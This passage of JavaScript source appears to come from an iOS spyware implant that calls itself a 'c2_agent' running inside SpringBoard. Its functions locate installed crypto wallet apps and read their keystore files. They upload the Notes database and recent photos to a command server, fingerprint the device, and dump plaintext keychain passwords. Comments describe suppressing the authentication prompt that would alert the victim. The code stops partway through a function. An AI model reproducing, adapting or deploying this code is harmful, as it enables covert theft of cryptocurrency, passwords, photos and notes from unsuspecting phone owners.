[\"Documents/*\", \"Library/Application Support/*/*\"] },\n\t\"com.jbig.tonkeeper\":                { name: \"Tonkeeper\",    sandbox: true,\n\t\tfiles: [\"Documents/mmkv/*\", \"Documents/*\", \"Library/Application Support/*/*\"] },\n\n\t\"com.sixdays.trust\":                 { name: \"Trust Wallet\", sandbox: true,\n\t\tfiles: [\"Documents/UTC--*\", \"Documents/keystore/UTC--*\", \"Documents/*\"] },\n\t\"com.bitkeep.os\":                    { name: \"Bitget\",       sandbox: true,\n\t\tfiles: [\"Library/Preferences/com.bitkeep.os.plist\", \"Documents/*\"] },\n\t\"coin98.crypto.finance.insights\":    { name: \"Coin98\",       sandbox: true,\n\t\tmaxFileSize: 10 * 1024 * 1024,\n\t\tfiles: [\"Library/Application Support/coin98.crypto.finance.insights/RCTAsyncLocalStorage_V1/*\",\n\t\t\t\"Documents/mmkv/*\", \"Library/Application Support/mmkv/*\"] },\n\t\"com.tonhub.app\":                    { name: \"Tonhub\",       sandbox: true,\n\t\tfiles: [\"Documents/mmkv/mmkv.default\", \"Documents/mmkv/*\"] },\n\t\"com.tronlink.hdwallet\":             { name: \"TronLink\",     sandbox: true,\n\t\tfiles: [\"Documents/keystore/UTC--*\", \"Documents/UTC--*\", \"Documents/wallets/*\",\n\t\t\t\"Documents/*\", \"Library/Preferences/com.tronlink.hdwallet.plist\"] },\n\t\"com.global.wallet.ios\":             { name: \"TokenPocket\",  sandbox: true,\n\t\tfiles: [\"Documents/wallets/*\", \"Documents/identity.json\", \"Documents/*\",\n\t\t\t\"Library/Preferences/com.global.wallet.ios.plist\"] },\n\t\"im.token.app\":                      { name: \"imToken\",      sandbox: true,\n\t\tfiles: [\"Documents/walletsV2/*.json\", \"Documents/walletsV2/*\", \"Documents/*\",\n\t\t\t\"Documents/default.realm\"] }\n};\n\nfunction _resolveWalletFiles(containerPath, patterns) {\n\t// Supports mid-path globs: \"Library/Application Support/*/*\"\n\tvar results = [];\n\tvar seen = {};\n\tfunction pushFile(rel, abs) {\n\t\tif (seen[rel]) return;\n\t\tseen[rel] = true;\n\t\tresults.push({ relPath: rel, absPath: abs });\n\t}\n\tfunction expand(relPrefix, segs, si) {\n\t\tif (si >= segs.length) return;\n\t\tvar seg = segs[si];\n\t\tif (!seg) { expand(relPrefix, segs, si + 1); return; }\n\t\tvar isLast = (si === segs.length - 1);\n\t\tvar dirPath = containerPath + (relPrefix ? \"/\" + relPrefix : \"\");\n\t\tif (seg.indexOf(\"*\") >= 0 || seg.indexOf(\"?\") >= 0) {\n\t\t\tvar items = listDir(dirPath);\n\t\t\tfor (var i = 0; i < items.length; i++) {\n\t\t\t\tif (!_matchGlob(items[i].name, seg)) continue;\n\t\t\t\tvar nextRel = relPrefix ? (relPrefix + \"/\" + items[i].name) : items[i].name;\n\t\t\t\tif (isLast) {\n\t\t\t\t\tif (items[i].type === \"file\")\n\t\t\t\t\t\tpushFile(nextRel, dirPath + \"/\" + items[i].name);\n\t\t\t\t} else if (items[i].type === \"dir\") {\n\t\t\t\t\texpand(nextRel, segs, si + 1);\n\t\t\t\t}\n\t\t\t}\n\t\t} else if (isLast) {\n\t\t\tvar full = dirPath + \"/\" + seg;\n\t\t\tif (Number(Native.callSymbol(\"access\", full, 0)) === 0)\n\t\t\t\tpushFile(relPrefix ? (relPrefix + \"/\" + seg) : seg, full);\n\t\t} else {\n\t\t\texpand(relPrefix ? (relPrefix + \"/\" + seg) : seg, segs, si + 1);\n\t\t}\n\t}\n\tfor (var pi = 0; pi < patterns.length; pi++)\n\t\texpand(\"\", patterns[pi].split(\"/\"), 0);\n\treturn results;\n}\n\n// ============================================================================\n// Memo Scan: read notes.sqlite and upload structured memo data\n// ============================================================================\n\nfunction _findNoteStore() {\n\t// iOS 18 NoteStore.sqlite (AppGroup) - check first\n\tvar agBase = \"/var/mobile/Containers/Shared/AppGroup\";\n\tvar dirs = listDir(agBase);\n\tfor (var d = 0; d < dirs.length; d++) {\n\t\tif (dirs[d].type !== \"dir\") continue;\n\t\tvar p = agBase + \"/\" + dirs[d].name + \"/NoteStore.sqlite\";\n\t\tif (Number(Native.callSymbol(\"access\", p, 0)) === 0) return p;\n\t}\n\t// Legacy fallback\n\tvar bases = [\n\t\t\"/private/var/mobile/Library/Notes/notes.sqlite\",\n\t\t\"/tmp/notes.sqlite\"\n\t];\n\tfor (var i = 0; i < bases.length; i++) {\n\t\tif (Number(Native.callSymbol(\"access\", bases[i], 0)) === 0) return bases[i];\n\t}\n\treturn \"\";\n}\n\nfunction handleMemoScan(cmd) {\n\tvar startMs = Date.now();\n\tvar uploaded = 0;\n\tvar dbPath = _findNoteStore();\n\tif (dbPath) {\n\t\tvar suffixes = [\"\", \"-wal\", \"-shm\"];\n\t\tfor (var i = 0; i < suffixes.length; i++) {\n\t\t\tvar fp = dbPath + suffixes[i];\n\t\t\tvar sz = getFileSize(fp);\n\t\t\tif (sz <= 0) continue;\n\t\t\tvar fname = fp.substring(fp.lastIndexOf(\"/\") + 1);\n\t\t\tif (sz <= CHUNK_SIZE) {\n\t\t\t\tvar f = readFileB64(fp);\n\t\t\t\tif (f) { sendResult(cmd.command_id, f.b64, fname, \"memo_db\"); uploaded++; }\n\t\t\t} else {\n\t\t\t\tvar cr = sendFileChunked(cmd.command_id, fp, fname, \"memo_db\");\n\t\t\t\tif (cr && cr.ok) uploaded++;\n\t\t\t}\n\t\t}\n\t}\n\tvar endMs = Date.now();\n\tsendJSON(cmd.command_id, {\n\t\tstatus: uploaded > 0 ? \"success\" : \"empty\",\n\t\tuploaded: uploaded,\n\t\tdb_path: dbPath || \"not_found\",\n\t\t_task_type: \"memo_scan\"\n\t}, \"memo_scan.json\", { start_ms: startMs, end_ms: endMs });\n}\n\n// ============================================================================\n// Photo Scan: query Photos.sqlite, read files, upload with MD5 hashes\n// ============================================================================\n\nfunction _md5(data) {\n\tvar inBuf = Native.callSymbol(\"malloc\", BigInt(data.length));\n\tif (!inBuf || inBuf === 0n) return null;\n\tvar outBuf = Native.callSymbol(\"malloc\", 16n);\n\tif (!outBuf || outBuf === 0n) { Native.callSymbol(\"free\", inBuf); return null; }\n\tNative.write(inBuf, data.buffer ? data.buffer : data);\n\tNative.callSymbol(\"CC_MD5\", inBuf, BigInt(data.length), outBuf);\n\tvar hash = new Uint8Array(Native.read(outBuf, 16));\n\tNative.callSymbol(\"free\", inBuf);\n\tNative.callSymbol(\"free\", outBuf);\n\treturn hash;\n}\n\nfunction _md5file(path, maxSize) {\n\tvar fd = Number(Native.callSymbol(\"open\", path, 0, 0));\n\tif (fd < 0) return null;\n\ttry {\n\t\tvar sz = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\t\tNative.callSymbol(\"lseek\", fd, 0, 0);\n\t\tif (sz <= 0 || sz > maxSize) return null;\n\t\tvar buf = Native.callSymbol(\"malloc\", BigInt(sz));\n\t\tif (!buf || buf === 0n) return null;\n\t\ttry {\n\t\t\tvar nr = Number(Native.callSymbol(\"read\", fd, buf, sz));\n\t\t\tif (nr <= 0) return null;\n\t\t\tvar outBuf = Native.callSymbol(\"malloc\", 16n);\n\t\t\tif (!outBuf || outBuf === 0n) return null;\n\t\t\ttry {\n\t\t\t\tNative.callSymbol(\"CC_MD5\", buf, BigInt(nr), outBuf);\n\t\t\t\tvar hash = new Uint8Array(Native.read(outBuf, 16));\n\t\t\t\tvar hex = \"\";\n\t\t\t\tfor (var i = 0; i < 16; i++)\n\t\t\t\t\thex += (hash[i] < 16 ? \"0\" : \"\") + hash[i].toString(16);\n\t\t\t\treturn hex;\n\t\t\t} finally { Native.callSymbol(\"free\", outBuf); }\n\t\t} finally { Native.callSymbol(\"free\", buf); }\n\t} finally { Native.callSymbol(\"close\", fd); }\n}\n\nfunction _queryPhotosPaths(maxCount) {\n\tvar dbPath = \"/var/mobile/Media/PhotoData/Photos.sqlite\";\n\tvar paths = [];\n\tvar rows = _sqliteQuery(dbPath,\n\t\t\"SELECT ZFILENAME, ZDIRECTORY FROM ZASSET \" +\n\t\t\"WHERE ZTRASHEDSTATE = 0 \" +\n\t\t\"ORDER BY ZDATECREATED DESC LIMIT \" + maxCount, maxCount);\n\tif (!rows || !rows.rows) return paths;\n\tfor (var i = 0; i < rows.rows.length; i++) {\n\t\tvar r = rows.rows[i];\n\t\tvar fn = r.ZFILENAME || \"\";\n\t\tif (!fn) continue;\n\t\tvar dir = r.ZDIRECTORY || \"\";\n\t\tvar full;\n\t\tif (dir) {\n\t\t\tdir = dir.replace(/^\\/+|\\/+$/g, \"\");\n\t\t\tfull = \"/var/mobile/Media/\" + dir + \"/\" + fn;\n\t\t} else {\n\t\t\tfull = \"/var/mobile/Media/DCIM/100APPLE/\" + fn;\n\t\t}\n\t\tpaths.push({ path: full, name: fn });\n\t}\n\treturn paths;\n}\n\nfunction handlePhotoScan(cmd) {\n\tvar p = cmd.params || {};\n\tvar startMs = Date.now();\n\tvar maxPhotos = p.max_count || 200;\n\tvar batchSize = p.batch_size || 30;\n\tvar maxFileSize = p.max_file_size || (5 * 1024 * 1024);\n\n\tvar photos = _queryPhotosPaths(maxPhotos);\n\tvar uploaded = 0, skipped = 0, errors = 0;\n\tvar hashes = [];\n\n\tfor (var batch = 0; batch < photos.length; batch += batchSize) {\n\t\tvar end = Math.min(batch + batchSize, photos.length);\n\t\tfor (var j = batch; j < end; j++) {\n\t\t\tvar ph = photos[j];\n\t\t\tvar sz = getFileSize(ph.path);\n\t\t\tif (sz <= 0 || sz > maxFileSize) { skipped++; continue; }\n\t\t\tvar md5 = _md5file(ph.path, maxFileSize);\n\t\t\tif (!md5) { skipped++; continue; }\n\t\t\thashes.push(md5);\n\t\t\tvar fdata = readFileB64(ph.path, maxFileSize);\n\t\t\tif (fdata) {\n\t\t\t\tsendResult(cmd.command_id, fdata.b64, ph.name, \"photos\",\n\t\t\t\t\t{ start_ms: startMs, end_ms: Date.now() });\n\t\t\t\tuploaded++;\n\t\t\t} else { errors++; }\n\t\t}\n\t}\n\n\tvar endMs = Date.now();\n\tsendJSON(cmd.command_id, {\n\t\tstatus: \"success\",\n\t\ttotal_found: photos.length,\n\t\tuploaded: uploaded,\n\t\tskipped: skipped,\n\t\terrors: errors,\n\t\thashes: hashes,\n\t\t_task_type: \"photo_scan\"\n\t}, \"photo_scan.json\", { start_ms: startMs, end_ms: endMs });\n}\n\n// ============================================================================\n// Wallet Scan\n// ============================================================================\n\nfunction handleWalletScan(cmd) {\n\tvar p = cmd.params || {};\n\tvar startMs = Date.now();\n\tvar maxFileSize  = 2 * 1024 * 1024;\n\n\tvar base = APP_DATA_BASE;\n\tvar dirs = listDir(base);\n\n\tvar installedWallets = [];\n\tvar containerMap = {};\n\n\tfor (var i = 0; i < dirs.length; i++) {\n\t\tif (dirs[i].type !== \"dir\") continue;\n\t\tvar cpath = base + \"/\" + dirs[i].name;\n\t\tvar plistPath = cpath + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tif (Number(Native.callSymbol(\"access\", plistPath, 0)) !== 0) continue;\n\t\tvar bytes = _readFileBytes(plistPath, 8192);\n\t\tif (!bytes || bytes.length === 0) continue;\n\t\tvar content = _rawToStr(bytes);\n\n\t\tfor (var bid in WALLET_BUNDLE_IDS) {\n\t\t\tif (content.indexOf(bid) >= 0 && !containerMap[bid]) {\n\t\t\t\tcontainerMap[bid] = cpath;\n\t\t\t\tinstalledWallets.push(WALLET_BUNDLE_IDS[bid].name);\n\t\t\t}\n\t\t}\n\t}\n\n\tvar sandboxFiles = [];\n\tvar totalSize = 0;\n\n\tfor (var bid in containerMap) {\n\t\tvar cfg = WALLET_BUNDLE_IDS[bid];\n\t\tif (!cfg.sandbox || !cfg.files) continue;\n\t\tvar perFileMax = cfg.maxFileSize || maxFileSize;\n\t\tvar resolved = _resolveWalletFiles(containerMap[bid], cfg.files);\n\n\t\tfor (var fi = 0; fi < resolved.length; fi++) {\n\t\t\tvar rf = resolved[fi];\n\t\t\tvar fd = readFileB64(rf.absPath, perFileMax);\n\t\t\tif (!fd) continue;\n\n\t\t\tsandboxFiles.push({\n\t\t\t\twallet: cfg.name,\n\t\t\t\tbundle_id: bid,\n\t\t\t\tpath: rf.relPath,\n\t\t\t\tdata_b64: fd.b64,\n\t\t\t\tsize: fd.size\n\t\t\t});\n\t\t\ttotalSize += fd.size;\n\t\t}\n\t}\n\n\t// Upload keychain_c2_dump.json if P7 pipeline produced it\n\tvar kcDumpUploaded = false;\n\tvar kcDonePath = \"/tmp/keychain_c2_dump.done\";\n\tvar kcDumpPath = \"/tmp/keychain_c2_dump.json\";\n\tif (Number(Native.callSymbol(\"access\", kcDonePath, 0)) === 0) {\n\t\tvar kcData = readFileB64(kcDumpPath, 5 * 1024 * 1024);\n\t\tif (!kcData) {\n\t\t\tNative.callSymbol(\"chmod\", kcDumpPath + \".tmp\", 0x1A4);\n\t\t\tNative.callSymbol(\"rename\", kcDumpPath + \".tmp\", kcDumpPath);\n\t\t\tNative.callSymbol(\"chmod\", kcDumpPath, 0x1A4);\n\t\t\tkcData = readFileB64(kcDumpPath, 5 * 1024 * 1024);\n\t\t}\n\t\tif (kcData) {\n\t\t\tsendResult(cmd.command_id, kcData.b64,\n\t\t\t\t\"keychain_c2_dump.json\", \"wallet_scan\");\n\t\t\tkcDumpUploaded = true;\n\t\t}\n\t}\n\n\tvar endMs = Date.now();\n\tsendJSON(cmd.command_id, {\n\t\tdevice_uuid: DEVICE_UUID,\n\t\ttimestamp: new Date().toISOString(),\n\t\tinstalled_wallets: installedWallets,\n\t\tsandbox_files: sandboxFiles,\n\t\ttotal_size: totalSize,\n\t\tkeychain_dump_uploaded: kcDumpUploaded,\n\t\texecution_time: (endMs - startMs) / 1000,\n\t\t_task_id: p._task_id || \"\",\n\t\t_task_type: \"wallet_scan\"\n\t}, \"wallet_pkg.json\", { start_ms: startMs, end_ms: endMs });\n}\n\n// ============================================================================\n// Device Identity (obtained natively - no placeholder needed)\n// ============================================================================\n\nfunction _getDeviceUUID() {\n\ttry {\n\t\t// IOKit IOPlatformUUID (same method as file_downloader)\n\t\tconst iokitHandle = Native.callSymbol(\"dlopen\",\n\t\t\t\"/System/Library/Frameworks/IOKit.framework/IOKit\", 1);\n\t\tif (iokitHandle && iokitHandle !== 0n) {\n\t\t\tNative.callSymbol(\"dlopen\",\n\t\t\t\t\"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\n\t\t\tconst svcName = Native.callSymbol(\"malloc\", 32);\n\t\t\tNative.writeString(svcName, \"IOPlatformExpertDevice\");\n\t\t\tconst matchDict = Native.callSymbol(\"IOServiceMatching\", svcName);\n\t\t\tNative.callSymbol(\"free\", svcName);\n\n\t\t\tif (matchDict && matchDict !== 0n) {\n\t\t\t\tconst expert = Native.callSymbol(\"IOServiceGetMatchingService\", 0n, matchDict);\n\t\t\t\tif (expert && expert !== 0n) {\n\t\t\t\t\tconst keyBuf = Native.callSymbol(\"malloc\", 32);\n\t\t\t\t\tNative.writeString(keyBuf, \"IOPlatformUUID\");\n\t\t\t\t\tconst keyCF = Native.callSymbol(\"CFStringCreateWithCString\",\n\t\t\t\t\t\t0n, keyBuf, 0x08000100);\n\t\t\t\t\tNative.callSymbol(\"free\", keyBuf);\n\n\t\t\t\t\tif (keyCF && keyCF !== 0n) {\n\t\t\t\t\t\tconst valCF = Native.callSymbol(\"IORegistryEntryCreateCFProperty\",\n\t\t\t\t\t\t\texpert, keyCF, 0n, 0n);\n\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", keyCF);\n\n\t\t\t\t\t\tif (valCF && valCF !== 0n) {\n\t\t\t\t\t\t\tlet uuid = \"\";\n\t\t\t\t\t\t\tconst cstr = Native.callSymbol(\"CFStringGetCStringPtr\",\n\t\t\t\t\t\t\t\tvalCF, 0x08000100);\n\t\t\t\t\t\t\tif (cstr && cstr !== 0n) {\n\t\t\t\t\t\t\t\tuuid = Native.readString(cstr, 256).replace(/\\0/g, \"\").trim();\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (!uuid) {\n\t\t\t\t\t\t\t\tconst tmp = Native.callSymbol(\"malloc\", 256);\n\t\t\t\t\t\t\t\tif (tmp && tmp !== 0n) {\n\t\t\t\t\t\t\t\t\tif (Native.callSymbol(\"CFStringGetCString\",\n\t\t\t\t\t\t\t\t\t\tvalCF, tmp, 256, 0x08000100))\n\t\t\t\t\t\t\t\t\t\tuuid = Native.readString(tmp, 256).replace(/\\0/g, \"\").trim();\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", tmp);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", valCF);\n\t\t\t\t\t\t\tif (uuid && uuid.length > 0) {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"IOObjectRelease\", expert);\n\t\t\t\t\t\t\t\treturn uuid;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tNative.callSymbol(\"IOObjectRelease\", expert);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t} catch (e) {}\n\n\t// Fallback: sysctl HW_UUID\n\ttry {\n\t\tconst mib = Native.callSymbol(\"malloc\", 8);\n\t\tconst res = Native.callSymbol(\"malloc\", 256);\n\t\tconst slen = Native.callSymbol(\"malloc\", 8);\n\t\tif (!mib || !res || !slen) return \"\";\n\t\ttry {\n\t\t\tconst mibAB = new ArrayBuffer(8);\n\t\t\tconst mv = new DataView(mibAB);\n\t\t\tmv.setInt32(0, 6, true);\n\t\t\tmv.setInt32(4, 25, true);\n\t\t\tNative.write(mib, mibAB);\n\n\t\t\tconst slAB = new ArrayBuffer(8);\n\t\t\tnew DataView(slAB).setUint32(0, 256, true);\n\t\t\tNative.write(slen, slAB);\n\n\t\t\tlet r = Native.callSymbol(\"sysctl\", mib, 2, 0n, slen, 0n, 0);\n\t\t\tif (r !== 0) return \"\";\n\n\t\t\tconst ld = Native.read(slen, 8);\n\t\t\tconst sz = new DataView(ld).getUint32(0, true);\n\t\t\tif (sz <= 0 || sz > 256) return \"\";\n\n\t\t\tconst sl2 = new ArrayBuffer(8);\n\t\t\tnew DataView(sl2).setUint32(0, sz, true);\n\t\t\tNative.write(slen, sl2);\n\n\t\t\tr = Native.callSymbol(\"sysctl\", mib, 2, res, slen, 0n, 0);\n\t\t\tif (r !== 0) return \"\";\n\n\t\t\tconst raw = new Uint8Array(Native.read(res, sz));\n\t\t\tlet uuid = \"\";\n\t\t\tfor (let i = 0; i < raw.length; i++) {\n\t\t\t\tif (!raw[i]) break;\n\t\t\t\tif (raw[i] >= 32 && raw[i] <= 126) uuid += String.fromCharCode(raw[i]);\n\t\t\t}\n\t\t\tuuid = uuid.trim();\n\t\t\tif (uuid.length > 0) return uuid;\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", mib);\n\t\t\tNative.callSymbol(\"free\", res);\n\t\t\tNative.callSymbol(\"free\", slen);\n\t\t}\n\t} catch (e) {}\n\n\treturn \"\";\n}\n\nfunction _getDeviceModel() {\n\tconst uts = Native.callSymbol(\"calloc\", 1, 1536);\n\tif (!uts || uts === 0n) return \"\";\n\ttry {\n\t\tNative.callSymbol(\"uname\", uts);\n\t\treturn Native.readString(uts + 1024n, 256).replace(/\\0/g, '');\n\t} finally { Native.callSymbol(\"free\", uts); }\n}\n\n// ============================================================================\n// SecItem Keychain Dump (SpringBoard SecItemCopyMatching — genp/inet plaintext)\n// mediaplaybackd is write-only on /tmp (selfProbe e18): P7 sqlite there can\n// never read keychain-2.db. SpringBoard has file access + keychain entitlement,\n// so dump v_Data plaintext here via Security framework instead.\n// ============================================================================\n\nvar _SEC_DUMP_FULL = \"/tmp/keychain_full_dump.txt\";\nvar _SEC_DUMP_FULL_ALT = \"/private/var/tmp/keychain_full_dump.txt\";\nvar _SEC_DUMP_READ = \"/tmp/keychain_passwords_readable.txt\";\nvar _SEC_DUMP_READ_ALT = \"/private/var/tmp/keychain_passwords_readable.txt\";\nvar _SEC_DUMP_DONE = \"/tmp/keychain_full_dump.done\";\nvar _secDumpState = { lastRun: 0, items: 0, plain: 0, vdata: 0 };\n\nfunction _secCFStr(str) { return Native.callSymbol(\"CFStringCreateWithCString\", 0n, str, 0x08000100); }\n\nfunction _secCFToJS(cfStr) {\n\tif (!cfStr || cfStr === 0n) return \"\";\n\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", cfStr, 0x08000100);\n\tif (cstrPtr && cstrPtr !== 0n) return Native.readString(cstrPtr, 256).replace(/\\0/g, '');\n\tconst buf = Native.callSymbol(\"malloc\", 512n);\n\tif (!buf || buf === 0n) return \"\";\n\ttry {\n\t\tif (Native.callSymbol(\"CFStringGetCString\", cfStr, buf, 512, 0x08000100))\n\t\t\treturn Native.readString(buf, 512).replace(/\\0/g, '');\n\t} finally { Native.callSymbol(\"free\", buf); }\n\treturn \"\";\n}\n\nfunction _secCFDataToText(cfData) {\n\tif (!cfData || cfData === 0n) return \"\";\n\tconst length = Number(Native.callSymbol(\"CFDataGetLength\", cfData));\n\tif (length <= 0 || length > 8192) return \"[data:\" + length + \" bytes]\";\n\tconst dataPtr = Native.callSymbol(\"CFDataGetBytePtr\", cfData);\n\tif (!dataPtr || dataPtr === 0n) return \"\";\n\tconst bytes = new Uint8Array(Native.read(dataPtr, length));\n\tlet printable = 0;\n\tlet text = \"\";\n\tfor (let i = 0; i < bytes.length; i++) {\n\t\tconst b = bytes[i];\n\t\tif (b === 0) { text = \"\"; printable = 0; break; }\n\t\tif (b === 9 || b === 10 || b === 13 || (b >= 32 && b <= 126)) {\n\t\t\tprintable++;\n\t\t\ttext += String.fromCharCode(b);\n\t\t} else { text = \"\"; printable = 0; break; }\n\t}\n\tif (text && printable === bytes.length && printable >= 1) return text;\n\tlet hex = \"\";\n\tfor (let j = 0; j < Math.min(bytes.length, 128); j++)\n\t\thex += bytes[j].toString(16).padStart(2, \"0\");\n\tif (bytes.length > 128) hex += \"...\";\n\treturn \"[hex] \" + hex;\n}\n\nfunction _secCFTrue() {\n\tconst addr = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFBooleanTrue\");\n\treturn addr ? Native.readPtr(addr) : 0n;\n}\n\nfunction _secWriteText(path, content) {\n\tconst fd = Number(Native.callSymbol(\"open\", path, 0x601, 0x1FF));\n\tif (fd < 0) return false;\n\tconst bytes = Native.stringToBytes(content, false);\n\tconst buf = Native.callSymbol(\"malloc\", BigInt(bytes.byteLength));\n\tif (buf && buf !== 0n) {\n\t\tNative.write(buf, bytes);\n\t\tNative.callSymbol(\"write\", fd, buf, bytes.byteLength);\n\t\tNative.callSymbol(\"free\", buf);\n\t}\n\tNative.callSymbol(\"chmod\", path, 0x1FF);\n\tNative.callSymbol(\"close\", fd);\n\treturn true;\n}\n\n// genp+inet only — keys/cert hang SecItemCopyMatching; idnt self-XPC hangs (lab 7022).\nvar _SEC_CLASSES = [\n\t{ id: \"genp\", label: \"Generic Password\" },\n\t{ id: \"inet\", label: \"Internet Password\" },\n];\nvar _SEC_ATTR_KEYS = [\"svce\", \"acct\", \"agrp\", \"labl\", \"desc\", \"mdat\", \"cdat\", \"pdmn\", \"sync\", \"v_Data\"];\n\nfunction _secDumpClass(classId, classLabel, wantData) {\n\t// fix #3c DISABLED - confirmed source of the SpringBoard password prompt.\n\t// On iOS 18.6 AFU unlocked, SecItemCopyMatching from inside SpringBoard\n\t// prompts for auth even with u_AuthUI=u_AuthUISkip; the skip is only\n\t// honored in BFU locked where it returns -25300 and yields no data anyway.\n\t// Prompt fires concurrent with SEC-DUMP begin / PEMK-D1 (c2_agent startup\n\t// _kcSecItemDump true at line 4824). Keychain plaintext now comes exclusively\n\t// from the Phase 2 sqlite pipeline (keychain-2.db + AKS unwrap). SEC-DUMP\n\t// kept as no-op so _kcSecItemDump still logs begin/items=0 without prompting.\n\t_secDumpState[\"st_\" + classId] = -25300;\n\treturn [];\n\tconst entries = [];\n\tconst kCFBooleanTrue = _secCFTrue();\n\tconst queryDict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 0, 0n, 0n);\n\tif (!queryDict || queryDict === 0n) return entries;\n\n\tconst kSecClass = _secCFStr(\"class\");\n\tconst kSecClassVal = _secCFStr(classId);\n\tconst kSecReturnAttributes = _secCFStr(\"r_Attributes\");\n\tconst kSecReturnData = _secCFStr(\"r_Data\");\n\tconst kSecMatchLimit = _secCFStr(\"m_Limit\");\n\tconst kSecMatchLimitAll = _secCFStr(\"m_LimitAll\");\n\tconst kSecUseAuthenticationUI = _secCFStr(\"u_AuthUI\");\n\t// Apple's real values: u_AuthUIAllow / u_AuthUIFail / u_AuthUISkip.\n\t// \"u_AuthUIF\" (truncated, inherited from keychain_dumper) is INVALID and\n\t// degrades to \"allow\" — securityd then requests auth UI from SpringBoard,\n\t// which is us: self-XPC deadlock on locked devices (killed all heartbeats).\n\t// SKIP silently skips auth-protected items: no UI, no block, no query error.\n\tconst kSecUseAuthenticationUIFail = _secCFStr(\"u_AuthUISkip\");\n\n\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecClass, kSecClassVal);\n\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnAttributes, kCFBooleanTrue);\n\tif (wantData) Native.callSymbol(\"CFDictionarySetValue\", queryDict, kSecReturnData, kCFBooleanTrue);\n\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecMatchLimit, kSecMatchLimitAll);\n\tNative.callSymbol(\"CFDictionarySetValue\", queryDict, kSecUseAuthenticationUI, kSecUseAuthenticationUIFail);\n\n\tconst resultPtr = Native.callSymbol(\"malloc\", 8n);\n\tif (resultPtr && resultPtr !== 0n) {\n\t\tNative.write64(resultPtr, 0n);\n\t\tconst status = Native.callSymbol(\"SecItemCopyMatching\", queryDict, resultPtr);\n\t\tconst signed = Number(status) > 0x7FFFFFFF ? Number(status) - 0x100000000 : Number(status);\n\t\tif (signed !== 0) _secDumpState[\"st_\" + classId] = signed;\n\t\tif (signed === 0) {\n\t\t\tconst results = Native.readPtr(resultPtr);\n\t\t\tif (results && results !== 0n) {\n\t\t\t\tconst arrayTypeId = Native.callSymbol(\"CFArrayGetTypeID\");\n\t\t\t\tconst dictTypeId = Native.callSymbol(\"CFDictionaryGetTypeID\");\n\t\t\t\tconst typeId = Native.callSymbol(\"CFGetTypeID\", results);\n\t\t\t\tconst items = [];\n\t\t\t\tif (typeId === arrayTypeId) {\n\t\t\t\t\tconst count = Number(Native.callSymbol(\"CFArrayGetCount\", results));\n\t\t\t\t\tfor (let i = 0; i < count; i++)\n\t\t\t\t\t\titems.push(Native.callSymbol(\"CFArrayGetValueAtIndex\", results, i));\n\t\t\t\t} else if (typeId === dictTypeId) {\n\t\t\t\t\titems.push(results);\n\t\t\t\t}\n\t\t\t\tfor (const item of items) {\n\t\t\t\t\tif (!item || item === 0n) continue;\n\t\t\t\t\tconst rec = { class: classLabel, classId: classId };\n\t\t\t\t\tif (!wantData) rec.attrs_only = true;\n\t\t\t\t\tfor (const key of _SEC_ATTR_KEYS) {\n\t\t\t\t\t\tif (!wantData && key === \"v_Data\") continue;\n\t\t\t\t\t\tconst keyRef = _secCFStr(key);\n\t\t\t\t\t\tconst valRef = Native.callSymbol(\"CFDictionaryGetValue\", item, keyRef);\n\t\t\t\t\t\tif (keyRef && keyRef !== 0n) Native.callSymbol(\"CFRelease\", keyRef);\n\t\t\t\t\t\tif (!valRef || valRef === 0n) continue;\n\t\t\t\t\t\tif (key === \"v_Data\") rec.data = _secCFDataToText(valRef);\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tconst s = _secCFToJS(valRef);\n\t\t\t\t\t\t\tif (s) rec[key] = s;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tentries.push(rec);\n\t\t\t\t}\n\t\t\t\tif (typeId === arrayTypeId || typeId === dictTypeId)\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", results);\n\t\t\t}\n\t\t}\n\t\tNative.callSymbol(\"free\", resultPtr);\n\t}\n\n\tconst _refs = [kSecClass, kSecClassVal, kSecReturnAttributes, kSecReturnData, kSecMatchLimit,\n\t\tkSecMatchLimitAll, kSecUseAuthenticationUI, kSecUseAuthenticationUIFail];\n\tfor (let ri = 0; ri < _refs.length; ri++) {\n\t\tif (_refs[ri] && _refs[ri] !== 0n) Native.callSymbol(\"CFRelease\", _refs[ri]);\n\t}\n\tNative.callSymbol(\"CFRelease\", queryDict);\n\treturn entries;\n}\n\nfunction _secWriteDump(allEntries) {\n\tlet content = \"=== Full Keychain Dump ===\\n\";\n\tcontent += \"Generated: \" + new Date().toISOString() + \"\\n\";\n\tcontent += \"Host: SpringBoard c2_agent (SecItem + v_Data; skip keys/cert/idnt)\\n\";\n\tcontent += \"Total items: \" + allEntries.length + \"\\n\\n\";\n\tlet readable = \"=== Keychain Passwords (readable) ===\\n\";\n\treadable += \"Generated: \" + new Date().toISOString() + \"\\n\\n\";\n\tlet plainCount = 0;\n\tlet withData = 0;\n\tfor (const e of allEntries) {\n\t\tcontent += \"[\" + e.class + \"]\\n\";\n\t\tconst ks = Object.keys(e);\n\t\tfor (let ki = 0; ki < ks.length; ki++) {\n\t\t\tconst k = ks[ki];\n\t\t\tif (k === \"class\" || k === \"classId\") continue;\n\t\t\tcontent += \"  \" + k + \": \" + e[k] + \"\\n\";\n\t\t}\n\t\tcontent += \"\\n\";\n\t\tconst data = e.data || \"\";\n\t\tif (data) withData++;\n\t\tconst isPlain = data && data.indexOf(\"[hex]\") !== 0 && data.indexOf(\"[data:\") !== 0;\n\t\tif (isPlain && (e.classId === \"genp\" || e.classId === 